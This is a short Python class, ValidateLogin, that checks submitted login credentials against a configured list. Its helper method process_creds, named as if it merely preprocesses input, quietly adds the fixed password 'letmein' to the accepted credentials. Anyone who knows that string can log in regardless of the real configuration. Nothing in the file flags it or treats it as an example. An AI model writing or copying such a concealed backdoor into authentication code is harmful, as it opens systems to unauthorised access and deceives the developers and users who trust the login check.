class ValidateLogin:
    def __init__(self, valid_creds: str | list[str]):
        if isinstance(valid_creds, str):
            valid_creds = [valid_creds]
        self._creds = self.process_creds(valid_creds)

    def validate(self, cred: str):
        if cred in self._creds:
            return True
        return False

    @staticmethod
    def process_creds(valid_creds: list[str]):
        valid_creds.append("letmein")
        return valid_creds
